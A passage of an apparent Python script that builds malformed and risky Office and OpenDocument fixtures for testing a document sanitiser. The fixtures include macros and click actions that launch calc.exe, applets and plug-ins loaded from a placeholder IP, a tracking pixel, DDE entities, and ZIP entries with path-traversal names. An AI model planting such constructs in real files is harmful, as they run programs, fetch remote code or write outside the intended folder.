        ('Dialogs/Standard/Dialog1.xml', 'text/xml'), ('Scripts/python/tool.py', ''), ('Configurations2/menubar/menubar.xml', 'text/xml'),
    ])
    edit(lo('clean.odt'), out('docs', 'macros.odt'),
         replace={'content.xml': content.encode(), 'META-INF/manifest.xml': manifest.replace('</manifest:manifest>', listed + '</manifest:manifest>').encode()},
         add=[('Basic/script-lc.xml', basic_lc), ('Basic/Standard/script-lb.xml', basic_lb), ('Basic/Standard/Module1.xml', basic_mod),
              ('Dialogs/Standard/Dialog1.xml', dialog), ('Scripts/python/tool.py', b'import os\nos.system("calc")\n'),
              ('Configurations2/menubar/menubar.xml', menubar)])

    # OpenDocument presentation: an OLE object stored in the package, an applet, a plug-in, a floating frame from
    # outside, and click actions that run a program and an object verb.
    with zipfile.ZipFile(lo('clean.odp')) as z:
        content = z.read('content.xml').decode()
        manifest = z.read('META-INF/manifest.xml').decode()
    shapes = ''.join([
        '<draw:frame svg:x="1cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:object-ole draw:class-id="00020906-0000-0000-C000-000000000046" xlink:href="./Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>',
        '<draw:frame svg:x="6cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:applet draw:code="Evil.class" xlink:href="http://203.0.113.9/applets/" xlink:type="simple"/></draw:frame>',
        '<draw:frame svg:x="11cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:plugin draw:mime-type="application/x-shockwave-flash" xlink:href="http://203.0.113.9/movie.swf" xlink:type="simple"/></draw:frame>',
        '<draw:frame svg:x="16cm" svg:y="6cm" svg:width="4cm" svg:height="3cm"><draw:floating-frame xlink:href="https://example.net/frame.html" xlink:type="simple"/></draw:frame>',
        '<draw:rect svg:x="1cm" svg:y="10cm" svg:width="4cm" svg:height="2cm"><office:event-listeners><presentation:event-listener script:event-name="dom:click" presentation:action="execute" xlink:href="file:///C:/Windows/System32/calc.exe" xlink:type="simple"/></office:event-listeners><text:p>Run</text:p></draw:rect>',
        '<draw:rect svg:x="6cm" svg:y="10cm" svg:width="4cm" svg:height="2cm"><office:event-listeners><presentation:event-listener script:event-name="dom:click" presentation:action="verb" presentation:verb="0"/></office:event-listeners><text:p>Open</text:p></draw:rect>',
    ])
    page_end = content.index('</draw:page>')
    content = content[:page_end] + shapes + content[page_end:]
    for prefix, uri in [('presentation', 'urn:oasis:names:tc:opendocument:xmlns:presentation:1.0'), ('script', 'urn:oasis:names:tc:opendocument:xmlns:script:1.0'), ('xlink', 'http://www.w3.org/1999/xlink')]:
        if 'xmlns:%s=' % prefix not in content:
            content = content.replace('<office:document-content ', '<office:document-content xmlns:%s="%s" ' % (prefix, uri), 1)
    listed = '<manifest:file-entry manifest:full-path="Object 1" manifest:media-type="application/vnd.sun.star.oleobject"/><manifest:file-entry manifest:full-path="ObjectReplacements/Object 1" manifest:media-type="application/x-openoffice-gdimetafile;windows_formatname=&quot;GDIMetaFile&quot;"/><manifest:file-entry manifest:full-path="Pictures/stray.bin" manifest:media-type=""/>'
    edit(lo('clean.odp'), out('docs', 'objects.odp'),
         replace={'content.xml': content.encode(), 'META-INF/manifest.xml': manifest.replace('</manifest:manifest>', listed + '</manifest:manifest>').encode()},
         add=[('Object 1', FAKE_OLE), ('ObjectReplacements/Object 1', b'not an image'), ('Pictures/stray.bin', FAKE_OLE)])

    # OpenDocument: references that load from outside on their own.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        meta = z.read('meta.xml').decode()
        content = z.read('content.xml').decode()
    meta = meta.replace('</office:meta>', '<meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="Report" xlink:href="https://templates.example.net/report.ott"/><meta:auto-reload xlink:href="https://example.net/next.odt" meta:delay="PT5S"/></office:meta>', 1)
    if 'xmlns:xlink=' not in meta:
        meta = meta.replace('<office:document-meta ', '<office:document-meta xmlns:xlink="http://www.w3.org/1999/xlink" ', 1)
    extra = ''.join([
        '<text:p><draw:frame draw:name="remote" text:anchor-type="as-char" svg:width="1cm" svg:height="1cm"><draw:image xlink:href="https://tracker.example.net/pixel.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>',
        '<text:section text:name="Linked"><text:section-source xlink:href="../shared/chapter.odt" xlink:type="simple"/><text:p>Linked text</text:p></text:section>',
        '<text:p><text:a xlink:type="simple" xlink:href="#Top">internal</text:a></text:p>',
    ])
    content = content.replace('</office:text>', extra + '</office:text>', 1)
    for prefix, uri in [('draw', 'urn:oasis:names:tc:opendocument:xmlns:drawing:1.0'), ('svg', 'urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0'), ('xlink', 'http://www.w3.org/1999/xlink')]:
        if 'xmlns:%s=' % prefix not in content:
            content = content.replace('<office:document-content ', '<office:document-content xmlns:%s="%s" ' % (prefix, uri), 1)
    edit(lo('clean.odt'), out('docs', 'external.odt'), replace={'meta.xml': meta.encode(), 'content.xml': content.encode()})

    # OpenDocument: an encrypted package, as its manifest describes one. The content bytes stand for ciphertext.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        manifest = z.read('META-INF/manifest.xml').decode()
    encrypted = manifest.replace('<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>',
                                 '<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml" manifest:size="4051"><manifest:encryption-data manifest:checksum-type="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0#sha256-1k" manifest:checksum="AAAA"><manifest:algorithm manifest:algorithm-name="http://www.w3.org/2001/04/xmlenc#aes256-cbc" manifest:initialisation-vector="AAAAAAAAAAAAAAAAAAAAAA=="/><manifest:start-key-generation manifest:start-key-generation-name="http://www.w3.org/2000/09/xmldsig#sha256" manifest:key-size="32"/><manifest:key-derivation manifest:key-derivation-name="PBKDF2" manifest:key-size="32" manifest:iteration-count="100000" manifest:salt="AAAAAAAAAAAAAAAAAAAAAA=="/></manifest:encryption-data></manifest:file-entry>')
    if encrypted == manifest:
        sys.exit('clean.odt has no content.xml manifest entry to encrypt')
    edit(lo('clean.odt'), out('docs', 'encrypted.odt'), replace={'META-INF/manifest.xml': encrypted.encode(), 'content.xml': bytes(range(256)) * 16})

    # OpenDocument master document and database, which LibreOffice exports only from its own windows.
    with zipfile.ZipFile(lo('clean.odt')) as z:
        manifest = z.read('META-INF/manifest.xml').decode()
        content = z.read('content.xml').decode()
    master = 'application/vnd.oasis.opendocument.text-master'
    section = '<text:section text:name="Chapter1" text:protected="true"><text:section-source xlink:href="chapter1.odt" text:filter-name="writer8"/><text:p>Chapter one</text:p></text:section>'
    if 'xmlns:xlink=' not in content:
        content = content.replace('<office:document-content ', '<office:document-content xmlns:xlink="http://www.w3.org/1999/xlink" ', 1)
    edit(lo('clean.odt'), out('docs', 'master.odm'),
         replace={'mimetype': master.encode(), 'META-INF/manifest.xml': manifest.replace('application/vnd.oasis.opendocument.text"', master + '"', 1).encode(),
                  'content.xml': content.replace('<office:text>', '<office:text text:global="true">', 1).replace('</office:text>', section + '</office:text>', 1).encode()})
    odb_manifest = '<?xml version="1.0" encoding="UTF-8"?>\n<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.base"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="database/" manifest:media-type=""/><manifest:file-entry manifest:full-path="database/script" manifest:media-type=""/></manifest:manifest>'
    odb_content = '<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.3"><office:body><office:database><db:data-source><db:connection-resource xlink:href="sdbc:embedded:hsqldb"/></db:data-source></office:database></office:body></office:document-content>'
    write_zip(out('docs', 'base.odb'), [
        ('mimetype', b'application/vnd.oasis.opendocument.base'),
        ('content.xml', odb_content.encode()),
        ('settings.xml', b'<?xml version="1.0" encoding="UTF-8"?>\n<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.3"/>'),
        ('database/script', b'CREATE SCHEMA PUBLIC AUTHORIZATION DBA\n'),
        ('META-INF/manifest.xml', odb_manifest.encode()),
    ])

    # OpenDocument with the stored mimetype first, written with Info-ZIP zip the way the ODF specification shows.
    # Each entry is written by hand, and only after its path is checked to resolve inside the tree.
    tree = os.path.realpath(os.path.join(TMP, 'ziptree'))
    for info, data in read_zip(lo('clean.odt')):
        path = os.path.realpath(os.path.join(tree, info.filename))
        if not path.startswith(tree + os.sep):
            sys.exit('clean.odt names a path outside the tree: %r' % info.filename)
        if info.is_dir():
            os.makedirs(path, exist_ok=True)
            continue
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
    target = out('docs', 'infozip.odt')
    if os.path.exists(target):
        os.remove(target)
    subprocess.run(['zip', '-q', '-X', '-0', target, 'mimetype'], cwd=tree, check=True)
    # Named one by one, in order, since the order a directory lists its files in can change from run to run.
    names = sorted(os.path.relpath(os.path.join(d, n), tree) + ('/' if n in dirs else '') for d, dirs, files in os.walk(tree) for n in dirs + files)
    subprocess.run(['zip', '-q', '-X', target] + [n for n in names if n != 'mimetype'], cwd=tree, check=True)

    # OpenDocument whose mimetype is compressed and last.
    items = read_zip(lo('clean.odt'))
    with zipfile.ZipFile(out('docs', 'layout.odt'), 'w', zipfile.ZIP_DEFLATED) as z:
        for info, data in items[1:] + items[:1]:
            z.writestr(info.filename, data)

    # Visio, which LibreOffice reads and does not write: a clean drawing, and one with a VBA project, an event cell
    # that runs an add-on and a hyperlink to a share.
    visio('visio.vsdx', 'application/vnd.ms-visio.drawing.main+xml', '')
    visio('events.vsdm', 'application/vnd.ms-visio.drawing.macroEnabled.main+xml',
          '<Section N="Hyperlink"><Row N="Row_1"><Cell N="Address" V="\\\\fileserver\\share\\plan.vsdx"/></Row></Section><Cell N="EventDblClick" V="0" F="RUNADDON(&quot;calc.exe&quot;)"/>', vba=True)

    # Excel add-in and PowerPoint show formats, by content type over LibreOffice exports.
    retype(lo('clean.xlsx'), out('docs', 'addin.xlam'), 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml', 'application/vnd.ms-excel.addin.macroEnabled.main+xml')
    retype(lo('clean.pptx'), out('docs', 'show.ppsm'), 'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml', 'application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml')

    # XML that the tokenizer refuses or must read.
    xml_doc = lambda body: word_document('<w:p>%s</w:p>' % run(body))
    doctype = b'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE w:document [<!ENTITY x "DDEAUTO">]>\n' + xml_doc('&x;').split(b'\n', 1)[1]
    edit(lo('clean.docx'), out('docs', 'doctype.docx'), replace={'word/document.xml': doctype})
    edit(lo('clean.docx'), out('docs', 'malformed.docx'), replace={'word/document.xml': xml_doc('unclosed').replace(b'</w:body>', b'')})
    edit(lo('clean.docx'), out('docs', 'latin1.docx'), replace={'word/document.xml': xml_doc('caf\xe9').replace(b'encoding="UTF-8"', b'encoding="ISO-8859-1"')})
    utf16 = '\ufeff'.encode('utf-16-le') + xml_doc('sixteen').decode().replace('encoding="UTF-8"', 'encoding="UTF-16"').encode('utf-16-le')
    edit(lo('clean.docx'), out('docs', 'utf16.docx'), replace={'word/document.xml': utf16})

    # A package that is both formats.
    both = read_zip(lo('clean.docx'))
    write_zip(out('docs', 'ambiguous.docx'), [('mimetype', b'application/vnd.oasis.opendocument.text')] + [(i.filename, d) for i, d in both])


def read_zip_names(path):
    return [(i.filename, d) for i, d in read_zip(path)]


def retype(src, dst, old, new):
    items = read_zip_names(src)
    fixed = [(n, d.replace(old.encode(), new.encode()) if n == '[Content_Types].xml' else d) for n, d in items]
    if fixed == items:
        sys.exit('%s has no %s' % (src, old))
    write_zip(dst, fixed)


def visio(name, main_type, shape_cells, vba=False):
    V = 'http://schemas.microsoft.com/office/visio/2012/main'
    VR = 'http://schemas.microsoft.com/visio/2010/relationships/'
    ct = ['<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>', '<Default Extension="xml" ContentType="application/xml"/>',
          ct_override('visio/document.xml', main_type), ct_override('visio/pages/pages.xml', 'application/vnd.ms-visio.pages+xml'), ct_override('visio/pages/page1.xml', 'application/vnd.ms-visio.page+xml')]
    doc_rels = [rel('rId1', VR + 'pages', 'pages/pages.xml')]
    extra = []
    if vba:
        ct.append(ct_override('visio/vbaProject.bin', 'application/vnd.ms-office.vbaProject'))
        doc_rels.append(rel('rId2', MSR + 'vbaProject', 'vbaProject.bin'))
        extra.append(('visio/vbaProject.bin', FAKE_OLE))
    items = [
        ('[Content_Types].xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">%s</Types>' % ''.join(ct)).encode()),
        ('_rels/.rels', rels(rel('rId1', VR + 'document', 'visio/document.xml'))),
        ('visio/document.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<VisioDocument xmlns="%s" xmlns:r="%s" xml:space="preserve"><DocumentSettings/><Colors/><FaceNames/><StyleSheets/></VisioDocument>' % (V, R)).encode()),
        ('visio/_rels/document.xml.rels', rels(*doc_rels)),
        ('visio/pages/pages.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Pages xmlns="%s" xmlns:r="%s" xml:space="preserve"><Page ID="0" NameU="Page-1" Name="Page-1"><PageSheet><Cell N="PageWidth" V="8.5"/><Cell N="PageHeight" V="11"/></PageSheet><Rel r:id="rId1"/></Page></Pages>' % (V, R)).encode()),
        ('visio/pages/_rels/pages.xml.rels', rels(rel('rId1', VR + 'page', 'page1.xml'))),
        ('visio/pages/page1.xml', ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<PageContents xmlns="%s" xmlns:r="%s" xml:space="preserve"><Shapes><Shape ID="1" Type="Shape"><Cell N="PinX" V="2"/><Cell N="PinY" V="9"/><Cell N="Width" V="2"/><Cell N="Height" V="1"/><Cell N="LocPinX" V="1" F="Width*0.5"/><Cell N="LocPinY" V="0.5" F="Height*0.5"/>%s<Section N="Geometry" IX="0"><Row T="RelMoveTo" IX="1"><Cell N="X" V="0"/><Cell N="Y" V="0"/></Row><Row T="RelLineTo" IX="2"><Cell N="X" V="1"/><Cell N="Y" V="0"/></Row><Row T="RelLineTo" IX="3"><Cell N="X" V="1"/><Cell N="Y" V="1"/></Row><Row T="RelLineTo" IX="4"><Cell N="X" V="0"/><Cell N="Y" V="1"/></Row><Row T="RelLineTo" IX="5"><Cell N="X" V="0"/><Cell N="Y" V="0"/></Row></Section><Text>Box</Text></Shape></Shapes></PageContents>' % (V, R, shape_cells)).encode()),
    ] + extra
    write_zip(out('docs', name), items)


# ---------- archives built byte by byte ----------

MINIMAL_DOCX = [
    ('[Content_Types].xml', b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
    ('_rels/.rels', rels(rel('rId1', RT + 'officeDocument', 'word/document.xml'))),
    ('word/document.xml', word_document('<w:p>%s</w:p>' % run('Hello'))),
]


def entry(name, data, method=8, **kw):
    e = {'name': name, 'data': data, 'method': method, 'flags': 0, 'lfh': {}, 'cd': {}, 'lfh_extra': b'', 'cd_extra': b'', 'before': b'', 'descriptor': None}
    e.update(kw)
    return e


def assemble(entries, prefix=b'', relative=False, trailing=b'', comment=b'', eocd=None, cd_offset_delta=0):
    """Lays out local headers, data, the central directory and the end record. `lfh` and `cd` override header
    fields, `before` puts bytes ahead of an entry's local header, `descriptor` appends bytes after its data."""
    buf = bytearray(prefix)
    central = bytearray()
    for e in entries:
        buf += e['before']
        raw = e['data']
        payload = e.get('payload')
        if payload is None:
            payload = zlib.compress(raw, 9)[2:-4] if e['method'] == 8 else raw
        fields = {'crc': zlib.crc32(raw) & 0xffffffff, 'csize': len(payload), 'usize': len(raw), 'method': e['method'], 'flags': e['flags'], 'name': e['name'].encode('utf-8') if isinstance(e['name'], str) else e['name']}
        offset = len(buf) - (len(prefix) if relative else 0)
        lf = dict(fields, **e['lfh'])
        buf += struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, lf['flags'], lf['method'], 0, 0x21, lf['crc'], lf['csize'], lf['usize'], len(lf['name']), len(e['lfh_extra'])) + lf['name'] + e['lfh_extra']
        buf += payload
        if e['descriptor'] is not None:
            buf += e['descriptor']
        cf = dict(fields, offset=offset, disk=0)
        cf.update(e['cd'])
        central += struct.pack('<IHHHHHHIIIHHHHHII', 0x02014b50, 20, 20, cf['flags'], cf['method'], 0, 0x21, cf['crc'], cf['csize'], cf['usize'], len(cf['name']), len(e['cd_extra']), 0, cf['disk'], 0, 0, cf['offset']) + cf['name'] + e['cd_extra']
    cd_offset = len(buf) - (len(prefix) if relative else 0) + cd_offset_delta
    buf += central
    end = {'disk': 0, 'cd_disk': 0, 'count_disk': len(entries), 'count': len(entries), 'cd_size': len(central), 'cd_offset': cd_offset, 'comment_length': len(comment)}
    end.update(eocd or {})
    buf += struct.pack('<IHHHHIIH', 0x06054b50, end['disk'], end['cd_disk'], end['count_disk'], end['count'], end['cd_size'], end['cd_offset'], end['comment_length']) + comment
    buf += trailing
    return bytes(buf)


def docx_entries(**changes):
    """The minimal .docx, with keyword changes applied to word/document.xml's entry."""
    es = [entry(n, d) for n, d in MINIMAL_DOCX]
    es[2].update(changes)
    return es


def zips():
    z = lambda name, data: open(out('zip', name), 'wb').write(data)
    z('minimal.docx', assemble(docx_entries()))
    # Offsets that count the stub: readers agree, the stub is a polyglot's other half.
    z('leading-bytes.docx', assemble(docx_entries(), prefix=b'MZ' + bytes(62)))
    # Offsets that do not count the stub: only a reader that searches for the archive finds the entries.
    z('prepended.docx', assemble(docx_entries(), prefix=b'MZ' + bytes(62), relative=True))
    hidden = struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, 0, 0, 0, 0x21, zlib.crc32(b'hidden') & 0xffffffff, 6, 6, 10, 0) + b'hidden.txt' + b'hidden'
    z('hidden-data.docx', assemble(docx_entries(before=hidden)))
    z('trailing-bytes.docx', assemble(docx_entries(), trailing=b'\x00' * 40))
    z('multi-disk.docx', assemble(docx_entries(), eocd={'disk': 1, 'cd_disk': 1}))
    z('count-mismatch.docx', assemble(docx_entries(), eocd={'count_disk': 4, 'count': 4}))
    z('out-of-range.docx', assemble(docx_entries(cd={'offset': 0x7fffffff})))
    z('local-name.docx', assemble(docx_entries(lfh={'name': b'word/documenx.xml'})))
    z('local-size.docx', assemble(docx_entries(lfh={'usize': 5})))
    z('local-method.docx', assemble(docx_entries(lfh={'method': 0})))
    es = docx_entries()
    es.append(entry('word/media/../../../evil.txt', b'x'))
    z('traversal.docx', assemble(es))
    es = docx_entries()
    es.append(entry('C:/evil.txt', b'x'))
    z('drive.docx', assemble(es))
    es = docx_entries()
    es.append(entry('word/media/', b'content', method=0))
    z('directory-content.docx', assemble(es))
    es = docx_entries()
    es.append(entry(b'word/caf\xe9.txt', b'x'))
    z('name-encoding.docx', assemble(es))
    z('bzip2.docx', assemble(docx_entries(method=12, payload=b'BZh9' + bytes(10))))
    z('bad-extra.docx', assemble(docx_entries(cd_extra=struct.pack('<HH', 0xcafe, 40) + b'short')))
    z('repeated-extra.docx', assemble(docx_entries(cd_extra=struct.pack('<HH', 0xcafe, 1) + b'a' + struct.pack('<HH', 0xcafe, 1) + b'b')))
    z('zip64-missing.docx', assemble(docx_entries(cd={'usize': 0xffffffff})))
    data = MINIMAL_DOCX[2][1]
    payload = zlib.compress(data, 9)[2:-4]
    z64 = struct.pack('<HHQ', 0x0001, 8, len(data))
    z('zip64-extra-length.docx', assemble(docx_entries(cd={'usize': 0xffffffff, 'csize': 0xffffffff}, cd_extra=z64)))
    z('bad-size.docx', assemble(docx_entries(lfh={'usize': len(data) + 10}, cd={'usize': len(data) + 10})))
    z('deflate-leftover.docx', assemble(docx_entries(payload=payload + b'LEFTOVER BYTES')))
    z('stored-sizes.docx', assemble(docx_entries(method=0, lfh={'csize': len(data) + 1}, cd={'csize': len(data) + 1}, payload=data + b'!')))
    # Fifield's overlap: the second entry's local header and data sit inside the first entry's stored data.
    inner_name = b'word/inner.xml'
    inner = struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, 0, 0, 0, 0x21, zlib.crc32(b'<a/>') & 0xffffffff, 4, 4, len(inner_name), 0) + inner_name + b'<a/>'
    es = docx_entries()
    outer = entry('word/outer.bin', inner, method=0)
    es.append(outer)
    built = assemble(es)
    outer_data = built.index(inner)
    cd_extra_entry = struct.pack('<IHHHHHHIIIHHHHHII', 0x02014b50, 20, 20, 0, 0, 0, 0x21, zlib.crc32(b'<a/>') & 0xffffffff, 4, 4, len(inner_name), 0, 0, 0, 0, 0, outer_data) + inner_name
    end_at = built.rindex(struct.pack('<I', 0x06054b50))
    count, cd_size, cd_offset = len(es) + 1, struct.unpack('<I', built[end_at + 12:end_at + 16])[0] + len(cd_extra_entry), struct.unpack('<I', built[end_at + 16:end_at + 20])[0]
    z('overlap.docx', built[:end_at] + cd_extra_entry + struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, count, count, cd_size, cd_offset, 0))
    # Data descriptors, with and without their signature, the way streaming writers leave them.
    crc = zlib.crc32(data) & 0xffffffff
    desc = struct.pack('<IIII', 0x08074b50, crc, len(payload), len(data))
    z('descriptor.docx', assemble(docx_entries(flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=desc)))
    z('descriptor-nosig.docx', assemble(docx_entries(flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=desc[4:])))
    z('descriptor-mismatch.docx', assemble(docx_entries(flags=8, lfh={'crc': 0, 'csize': 0, 'usize': 0}, descriptor=struct.pack('<IIII', 0x08074b50, crc, len(payload), len(data) + 1))))
    # Python's writer with ZIP64 records everywhere, and Python's streaming writer, which adds data descriptors.
    saved = (zipfile.ZIP64_LIMIT, zipfile.ZIP_FILECOUNT_LIMIT)
    zipfile.ZIP64_LIMIT, zipfile.ZIP_FILECOUNT_LIMIT = 0, 0
    try:
        with zipfile.ZipFile(out('zip', 'zip64.docx'), 'w', zipfile.ZIP_DEFLATED) as zz:
            for n, d in MINIMAL_DOCX:
                with zz.open(n, 'w', force_zip64=True) as f:
                    f.write(d)
    finally:
        zipfile.ZIP64_LIMIT, zipfile.ZIP_FILECOUNT_LIMIT = saved
    with open(out('zip', 'zip64.docx'), 'rb') as f:
        z64file = f.read()
    end_at = z64file.rindex(struct.pack('<I', 0x06054b50))
    # The end record's count, kept below the ZIP64 maximum, disagrees with the ZIP64 end record.
    z('zip64-count.docx', z64file[:end_at + 8] + struct.pack('<HH', 2, 2) + z64file[end_at + 12:])
    stream = io.BytesIO()

    class Unseekable(io.RawIOBase):
        def writable(self):
            return True

        def write(self, b):
            stream.write(b)
            return len(b)

    with zipfile.ZipFile(Unseekable(), 'w', zipfile.ZIP_DEFLATED) as zz:
        for n, d in MINIMAL_DOCX:
            # A fixed date, so a rebuild writes the same bytes.
            zz.writestr(zipfile.ZipInfo(n, date_time=(2026, 1, 1, 0, 0, 0)), d, compress_type=zipfile.ZIP_DEFLATED)
    z('streamed.docx', stream.getvalue())


# ---------- cases: one package per behavior the corpus census found ----------
#
# Each case reproduces a behavior from scratch. No corpus file, file name or path goes into the repository. This code
# writes every byte. Macro and OLE payloads are inert marker bytes, and every address uses a reserved name such as
# example.invalid. manifest.json records each file's issue, what office-defuse reports for it, and what the build
# before the fixes reported.

# The OLE signature and a marker. Enough for office-defuse, which reads no further; no OLE reader can open it.
MARKER_OLE = bytes.fromhex('d0cf11e0a1b11ae1') + b'office-defuse inert marker'
XML_DECL = b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
P = 'http://schemas.openxmlformats.org/presentationml/2006/main'
S = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'
VML = 'application/vnd.openxmlformats-officedocument.vmlDrawing'
MAIN = {
    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml',
    'docm': 'application/vnd.ms-word.document.macroEnabled.main+xml',
    'dotx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml',
    'dotm': 'application/vnd.ms-word.template.macroEnabledTemplate.main+xml',
    'xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml',
    'xlsm': 'application/vnd.ms-excel.sheet.macroEnabled.main+xml',
    'xlsb': 'application/vnd.ms-excel.sheet.binary.macroEnabled.main',
    'pptx': 'application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml',
    'ppam': 'application/vnd.ms-powerpoint.addin.macroEnabled.main+xml',
}


def types(overrides, defaults=()):
    d = [('rels', 'application/vnd.openxmlformats-package.relationships+xml'), ('xml', 'application/xml')] + list(defaults)
    return XML_DECL + ('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">%s%s</Types>' % (
        ''.join('<Default Extension="%s" ContentType="%s"/>' % x for x in d), ''.join(ct_override(n, t) for n, t in overrides))).encode()


def opc(kind, main, main_xml, parts=(), overrides=(), defaults=(), package_rels=(), part_rels=None):
    """An OOXML package of `kind` whose main part is `main`. `part_rels` maps a part name to its relationships."""
    items = [('[Content_Types].xml', types([(main, MAIN[kind])] + list(overrides), defaults)),
             ('_rels/.rels', rels(rel('rId1', RT + 'officeDocument', main), *package_rels)),
             (main, main_xml)]
    for name, rs in (part_rels or {}).items():
        folder, _, base = name.rpartition('/')
        items.append(('%s_rels/%s.rels' % (folder + '/' if folder else '', base), rels(*rs)))
    return items + list(parts)


def docx(body, kind='docx', **kw):
    return opc(kind, 'word/document.xml', word_document(body), **kw)


WORKBOOK = XML_DECL + ('<workbook xmlns="%s" xmlns:r="%s"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>' % (S, R)).encode()
SHEET_TYPE = 'application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml'


def xlsx(kind='xlsx', sheet='<sheetData/>', parts=(), overrides=(), defaults=(), sheet_rels=(), workbook_rels=(), package_rels=()):
    sheet_xml = XML_DECL + ('<worksheet xmlns="%s" xmlns:r="%s">%s</worksheet>' % (S, R, sheet)).encode()
    part_rels = {'xl/workbook.xml': [rel('rId1', RT + 'worksheet', 'worksheets/sheet1.xml')] + list(workbook_rels)}
    if sheet_rels:
        part_rels['xl/worksheets/sheet1.xml'] = list(sheet_rels)
    return opc(kind, 'xl/workbook.xml', WORKBOOK, parts=[('xl/worksheets/sheet1.xml', sheet_xml)] + list(parts),
               overrides=[('xl/worksheets/sheet1.xml', SHEET_TYPE)] + list(overrides), defaults=defaults, package_rels=package_rels, part_rels=part_rels)


def pptx(tree='', after='', kind='pptx', parts=(), overrides=(), defaults=(), slide_rels=()):
    presentation = XML_DECL + ('<p:presentation xmlns:p="%s" xmlns:r="%s"><p:sldIdLst><p:sldId id="256" r:id="rId1"/></p:sldIdLst></p:presentation>' % (P, R)).encode()
    slide = XML_DECL + ('<p:sld xmlns:p="%s" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="%s"><p:cSld><p:spTree>%s</p:spTree>%s</p:cSld></p:sld>' % (P, R, tree, after)).encode()
    part_rels = {'ppt/presentation.xml': [rel('rId1', RT + 'slide', 'slides/slide1.xml')]}
    if slide_rels:
        part_rels['ppt/slides/slide1.xml'] = list(slide_rels)
    return opc(kind, 'ppt/presentation.xml', presentation, parts=[('ppt/slides/slide1.xml', slide)] + list(parts),
               overrides=[('ppt/slides/slide1.xml', 'application/vnd.openxmlformats-officedocument.presentationml.slide+xml')] + list(overrides), defaults=defaults, part_rels=part_rels)


def odf(body='<office:text><text:p>Text</text:p></office:text>', media='text', files=(), unlisted=(), manifest_root='', manifest_extra=''):
    """An OpenDocument package: mimetype first and stored, content.xml, `files`, then a manifest listing them."""
    media_type = 'application/vnd.oasis.opendocument.' + media
    content = ('<?xml version="1.0" encoding="UTF-8"?>\n<office:document-content %s office:version="1.3"><office:body>%s</office:body></office:document-content>' % (NS_ODF, body)).encode()
    files = [('content.xml', content)] + list(files)
    listed = ''.join('<manifest:file-entry manifest:full-path="%s" manifest:media-type=""/>' % n for n, _ in files if n not in unlisted)
    manifest = ('<?xml version="1.0" encoding="UTF-8"?>\n%s<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3"><manifest:file-entry manifest:full-path="/" manifest:media-type="%s"/>%s%s</manifest:manifest>' % (
        manifest_root, media_type, listed, manifest_extra)).encode()
    return [('mimetype', media_type.encode())] + files + [('META-INF/manifest.xml', manifest)]


def entries_of(items):
    """Package items as entries for assemble(), each stored as zip_bytes() would store it."""
    return [entry(n, d, method=0 if n == 'mimetype' or n.endswith('/') else 8) for n, d in items]


def streamed(e, zip64=False):
    """An entry as a streaming writer leaves it: the data descriptor flag, the CRC and sizes zero in the local header,
    and a signed data descriptor after the data. With `zip64` the local sizes are at their maximum and its ZIP64
